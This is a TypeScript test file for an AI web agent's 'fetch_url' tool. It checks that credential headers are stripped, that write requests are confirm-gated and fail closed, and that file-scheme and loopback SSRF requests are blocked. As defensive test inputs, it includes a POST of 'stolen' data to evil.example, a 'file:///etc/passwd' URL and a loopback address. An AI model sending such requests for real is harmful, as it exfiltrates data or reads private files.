// fetch_url is the web actor's secure, non-render web mechanism. These tests pin the
// invariants that keep the (keyless) web actor keyless even with an egress surface:
//   - the TOOL never sets credentials of its own (no `credentials` key) and strips
//     tool-supplied Cookie/Authorization — it cannot opt a request into a session. The
//     SESSION decision is the egress BOUNDARY's (same-origin to the owned tab → include,
//     else omit), exercised in tests/peerd-egress/session-scoped-fetch.test.ts.
//   - rides ctx.webFetch (the denylist + SSRF + audit chain), NOT a raw fetch
//   - a non-GET write is confirm-gated (shared web:write key) and FAILS CLOSED with
//     no confirm channel
//   - the response crosses the <untrusted_web_content> boundary (it's open-web data)

import { describe, test, expect } from 'bun:test';
import { fetchUrlTool } from '../../../extension/peerd-runtime/tools/defs/fetch-url.js';
import { resolveRuntimeCapabilities } from '../../../extension/peerd-runtime/runtime-capabilities.js';

const TAG_OPEN = /^<untrusted_web_content origin="[^"]*" tool="([^"]*)" retrieved_at="[^"]*">\n/;
const TAG_CLOSE = /\n<\/untrusted_web_content>$/;
const unwrap = (content: string) => {
  expect(content).toMatch(TAG_OPEN);
  expect(content).toMatch(TAG_CLOSE);
  return JSON.parse(content.replace(TAG_OPEN, '').replace(TAG_CLOSE, ''));
};
const toolOf = (content: string) => (content.match(TAG_OPEN) as RegExpMatchArray)[1];

const mockResponse = ({ status = 200, body = '', headers = {}, url = 'https://x.com/' } = {}) => ({
  status, ok: status >= 200 && status < 300,
  text: async () => body,
  headers: { get: (k: string) => (headers as any)[k.toLowerCase()], forEach: (cb: any) => Object.entries(headers).forEach(([k, v]) => cb(v, k)) },
  url,
});

// Records what webFetch was handed so the sessionless invariants are assertable.
const recordingCtx = (over: any = {}) => {
  const seen: { url?: string; init?: any } = {};
  const webFetch = over.webFetch ?? (async (url: string, init: any) => {
    seen.url = url; seen.init = init; return mockResponse({ body: 'ok' });
  });
  const resourceAuthority: any = {
    requestWebText: async (request: any) => {
      seen.url = request.url;
      seen.init = { method: request.method, headers: request.headers, body: request.body };
      const response = await webFetch(request.url, seen.init);
      const headers: Record<string, string> = {};
      response.headers.forEach((value: string, name: string) => { headers[name] = value; });
      return { status: response.status, body: await response.text(), headers, finalUrl: response.url };
    },
  };
  if (typeof over.confirm === 'function') {
    resourceAuthority.confirmWebWrite = (url: string, method: string) => over.confirm({
      tool: 'web:write', kind: 'web_write', origins: [new URL(url).origin],
      summary: `Allow a ${method} request to ${new URL(url).host}? This can send data out of the browser.`,
      sessionId: 't',
    });
  }
  if (over.webOffscreenClient?.extractMarkdown) {
    resourceAuthority.extractReadableMarkdown = (html: string, url: string) =>
      over.webOffscreenClient.extractMarkdown({ html, url });
  }
  if (over.resultStore?.key && over.resultStore?.put) {
    resourceAuthority.spillResult = async (record: any) => {
      const key = over.resultStore.key();
      await over.resultStore.put({ ...record, key, ownerSessionId: 't' });
      return key;
    };
  }
  const ctx: any = {
    resourceAuthority,
    runtimeCapabilities: over.runtimeCapabilities,
  };
  return { ctx, seen };
};

describe('fetch_url — sessionless secure fetch', () => {
  test('GET wraps the response as untrusted, parses JSON, omits credentials', async () => {
    const { ctx, seen } = recordingCtx({
      webFetch: async (_u: string, init: any) => { (seen as any).init = init; return mockResponse({ body: '{"price":9}', headers: { 'content-type': 'application/json' }, url: 'https://api.shop.com/p' }); },
    });
    const r = await fetchUrlTool.execute({ url: 'https://api.shop.com/p' }, ctx);
    expect(r.ok).toBe(true);
    if (!r.ok) throw new Error('expected ok');
    expect(toolOf(r.content!)).toBe('fetch_url');
    const p = unwrap(r.content!);
    expect(p.status).toBe(200);
    expect(p.json.price).toBe(9);
    // The TOOL never sets credentials — the SESSION decision is the boundary's
    // (ctx.webFetch is session-scoped). So a tool can't opt a request into the session.
    expect('credentials' in (seen as any).init).toBe(false);
  });

  test('strips Cookie / Authorization / Proxy-Authorization (no laundered credential)', async () => {
    const { ctx, seen } = recordingCtx();
    await fetchUrlTool.execute({
      url: 'https://api.shop.com/p',
      headers: { Cookie: 'session=secret', authorization: 'Bearer x', 'Proxy-Authorization': 'y', 'X-Keep': 'ok' },
    }, ctx);
    const sent = seen.init.headers;
    expect(sent.Cookie).toBeUndefined();
    expect(sent.authorization).toBeUndefined();
    expect(sent['Proxy-Authorization']).toBeUndefined();
    expect(sent['X-Keep']).toBe('ok');               // non-session headers pass through
    // The real same-origin cookies come from the browser jar via the boundary, never
    // a tool-supplied header — so the tool sets no credentials of its own.
    expect('credentials' in seen.init).toBe(false);
  });

  test('does not turn an array-shaped headers arg into numeric wire headers', async () => {
    const { ctx, seen } = recordingCtx();
    await fetchUrlTool.execute({
      url: 'https://api.shop.com/p',
      headers: ['payload-that-must-not-become-header-zero'],
    }, ctx);
    expect(seen.init.headers).toEqual({});
  });

  test('a non-GET write is confirm-gated (shared web:write key); declines on "no"', async () => {
    const calls: any[] = [];
    let fetched = false;
    const { ctx } = recordingCtx({
      confirm: async (p: any) => { calls.push(p); return 'no'; },
      webFetch: async () => { fetched = true; return mockResponse({ body: 'ok' }); },
    });
    const r = await fetchUrlTool.execute({ url: 'https://evil.example/x', method: 'POST', body: { stolen: 1 } }, ctx);
    expect(r.ok).toBe(false);
    expect(calls).toHaveLength(1);
    expect(calls[0].tool).toBe('web:write');
    expect(calls[0].origins).toEqual(['https://evil.example']);
    expect(fetched).toBe(false);                     // declined → never sent
  });

  test('a non-GET write FAILS CLOSED with no confirm channel', async () => {
    let fetched = false;
    const { ctx } = recordingCtx({ confirm: undefined, webFetch: async () => { fetched = true; return mockResponse(); } });
    const r = await fetchUrlTool.execute({ url: 'https://evil.example/x', method: 'POST' }, ctx);
    expect(r.ok).toBe(false);
    expect(fetched).toBe(false);
  });

  test('a confirmed POST is sent, JSON body stringified + Content-Type set', async () => {
    const { ctx, seen } = recordingCtx({ confirm: async () => 'yes_once' });
    const r = await fetchUrlTool.execute({ url: 'https://api.shop.com/x', method: 'POST', body: { a: 1 } }, ctx);
    expect(r.ok).toBe(true);
    expect(seen.init.body).toBe('{"a":1}');
    expect(seen.init.headers['Content-Type']).toBe('application/json');
    expect('credentials' in seen.init).toBe(false);  // the boundary decides, not the tool
  });

  test('rejects a non-http(s) scheme and an invalid url before any fetch', async () => {
    let fetched = false;
    const { ctx } = recordingCtx({ webFetch: async () => { fetched = true; return mockResponse(); } });
    expect((await fetchUrlTool.execute({ url: 'file:///etc/passwd' }, ctx)).ok).toBe(false);
    expect((await fetchUrlTool.execute({ url: 'not a url' }, ctx)).ok).toBe(false);
    expect(fetched).toBe(false);
  });

  test('a blocked redirect surfaces an actionable error (fetch_url does not follow)', async () => {
    const { ctx } = recordingCtx({
      webFetch: async () => { const e: any = new Error('Egress denied'); e.reason = 'redirect_blocked'; throw e; },
    });
    const r = await fetchUrlTool.execute({ url: 'https://shop.com/p' }, ctx);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error('expected failure');
    expect(r.error).toMatch(/redirect/i);
  });

  test('a private/loopback SSRF block steers to RENDER, not "unreachable"', async () => {
    // The web-actor fetch-vs-read fix: the actor was misreading this SSRF refusal
    // as "the site is unreachable" and giving up on a page it could just open.
    const { ctx } = recordingCtx({
      webFetch: async () => { const e: any = new Error('Egress denied'); e.reason = 'private_network'; throw e; },
    });
    const r = await fetchUrlTool.execute({ url: 'http://127.0.0.1:8080/p' }, ctx);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error('expected failure');
    expect(r.error).toMatch(/navigate|render/i);      // steers to the render path
    expect(r.error).toMatch(/private|loopback/i);      // names why the direct fetch was blocked
  });
});

// --- the content pipeline: HTML→markdown extraction + spill-and-page ---------
// The extraction is FAIL-OPEN (a non-article page, a missing client, or an
// extraction error all keep the raw behavior); the spill turns the old silent
// head-only slice into a windowed body + a trusted paging footer OUTSIDE the
// fence.

const HTML_HEADERS = { 'content-type': 'text/html; charset=utf-8' };
const htmlCtx = (over: any = {}) => recordingCtx({
  webFetch: async () => mockResponse({ body: '<html><body><p>raw page</p></body></html>', headers: HTML_HEADERS, url: 'https://site.example/a' }),
  ...over,
}).ctx;

describe('fetch_url — markdown extraction (fail-open)', () => {
  test('an HTML response routes through the extraction client and comes back as markdown', async () => {
    const ctx = htmlCtx({
      webOffscreenClient: {
        extractMarkdown: async ({ html, url }: any) => {
          expect(html).toContain('raw page');
          expect(url).toBe('https://site.example/a');
          return { readerable: true, markdown: '# Title\n\nclean body', title: 'Title', htmlTruncated: false };
        },
      },
    });
    const r = await fetchUrlTool.execute({ url: 'https://site.example/a' }, ctx);
    if (!r.ok) throw new Error('expected ok');
    const body = unwrap(r.content!);
    expect(body.format).toBe('markdown');
    expect(body.title).toBe('Title');
    expect(body.body).toContain('clean body');
  });

  test('raw:true bypasses extraction entirely', async () => {
    let called = false;
    const ctx = htmlCtx({ webOffscreenClient: { extractMarkdown: async () => { called = true; return { readerable: true, markdown: 'x' }; } } });
    const r = await fetchUrlTool.execute({ url: 'https://site.example/a', raw: true }, ctx);
    if (!r.ok) throw new Error('expected ok');
    expect(called).toBe(false);
    expect(unwrap(r.content!).format).toBe('raw');
  });

  test('a non-readerable page and an extraction error both fall back to raw', async () => {
    for (const client of [
      { extractMarkdown: async () => ({ readerable: false, htmlTruncated: false }) },
      { extractMarkdown: async () => { throw new Error('boom'); } },
    ]) {
      const r = await fetchUrlTool.execute({ url: 'https://site.example/a' }, htmlCtx({ webOffscreenClient: client }));
      if (!r.ok) throw new Error('expected ok');
      const body = unwrap(r.content!);
      expect(body.format).toBe('raw');
      expect(body.body).toContain('raw page');
    }
  });

  test('a missing client (Firefox: no offscreen doc) keeps the raw behavior', async () => {
    const r = await fetchUrlTool.execute({ url: 'https://site.example/a' }, htmlCtx());
    if (!r.ok) throw new Error('expected ok');
    expect(unwrap(r.content!).format).toBe('raw');
  });

  test('non-HTML content types never touch the extraction client', async () => {
    let called = false;
    const { ctx } = recordingCtx({
      webFetch: async () => mockResponse({ body: '{"a":1}', headers: { 'content-type': 'application/json' }, url: 'https://api.example/x' }),
      webOffscreenClient: { extractMarkdown: async () => { called = true; return { readerable: true, markdown: 'x' }; } },
    });
    const r = await fetchUrlTool.execute({ url: 'https://api.example/x' }, ctx);
    if (!r.ok) throw new Error('expected ok');
    expect(called).toBe(false);
    expect(unwrap(r.content!).json).toEqual({ a: 1 });
  });
});

describe('fetch_url — spill-and-page for an oversized body', () => {
  const BIG = 'H'.repeat(15_000) + 'M'.repeat(30_000) + 'T'.repeat(15_000);   // 60k chars

  test('spills the full text, shows head+tail, and appends the paging footer OUTSIDE the fence', async () => {
    const stored: any[] = [];
    const { ctx } = recordingCtx({
      webFetch: async () => mockResponse({ body: BIG, headers: { 'content-type': 'text/plain' }, url: 'https://site.example/big' }),
      resultStore: { key: () => 'result:opaque-fetch', put: async (rec: any) => { stored.push(rec); } },
    });
    const r = await fetchUrlTool.execute({ url: 'https://site.example/big' }, ctx);
    if (!r.ok) throw new Error('expected ok');
    // The FULL text was spilled.
    expect(stored).toHaveLength(1);
    expect(stored[0]).toMatchObject({
      key: 'result:opaque-fetch', ownerSessionId: 't', producer: 'fetch_url',
      fenced: true, originLabel: 'https://site.example',
    });
    expect(stored[0].text.length).toBe(60_000);
    // The fenced body is the head+tail window with the elision marker.
    const afterFence = r.content!.split('</untrusted_web_content>')[1];
    expect(afterFence).toContain('read_result');
    expect(afterFence).toContain('"key": "result:opaque-fetch"');
    // unwrap() anchors the close tag at $ — with a footer after the fence,
    // parse the fenced JSON by splitting at the tags instead.
    const body = JSON.parse(r.content!.split(/<untrusted_web_content [^>]*>\n/)[1].split('\n</untrusted_web_content>')[0]);
    expect(body.truncated).toBe(true);
    expect(body.body).toContain('characters elided');
    expect(body.body.startsWith('H'.repeat(100))).toBe(true);
    expect(body.body.endsWith('T'.repeat(100))).toBe(true);
  });

  test('no resultStore capability → the pre-spill head-only slice, no footer', async () => {
    const { ctx } = recordingCtx({
      webFetch: async () => mockResponse({ body: BIG, headers: { 'content-type': 'text/plain' }, url: 'https://site.example/big' }),
    });
    const r = await fetchUrlTool.execute({ url: 'https://site.example/big' }, ctx);
    if (!r.ok) throw new Error('expected ok');
    expect(r.content).not.toContain('read_result');
    const body = unwrap(r.content!);
    expect(body.truncated).toBe(true);
    expect(body.body.length).toBe(16_000);
    expect(body.body.endsWith('M'.repeat(100))).toBe(true);   // head-only: ends mid-middle
  });

  test('a small body is untouched: no spill, no footer, truncated:false', async () => {
    const stored: any[] = [];
    const { ctx } = recordingCtx({
      resultStore: { key: () => 'result:opaque-small', put: async (rec: any) => { stored.push(rec); } },
    });
    const r = await fetchUrlTool.execute({ url: 'https://x.com/' }, ctx);
    if (!r.ok) throw new Error('expected ok');
    expect(stored).toHaveLength(0);
    expect(r.content).not.toContain('[paging]');
    expect(unwrap(r.content!).truncated).toBe(false);
  });

  test('a binary document never recommends a reader missing from this runtime', async () => {
    const { ctx } = recordingCtx({
      runtimeCapabilities: resolveRuntimeCapabilities({ offscreenDocument: false }),
      webFetch: async () => mockResponse({
        body: '%PDF-1.7',
        headers: { 'content-type': 'application/pdf' },
        url: 'https://files.example/report.pdf',
      }),
    });
    const result = await fetchUrlTool.execute({ url: 'https://files.example/report.pdf' }, ctx);
    if (result.ok) throw new Error('expected a binary document refusal');
    expect(result.error).toBe('binary_document');
    expect((result as any).readerAvailable).toBe(false);
    expect(result.content).not.toContain('read_doc');
    expect(result.content).toContain('Ask the user to attach this PDF directly');
  });
});
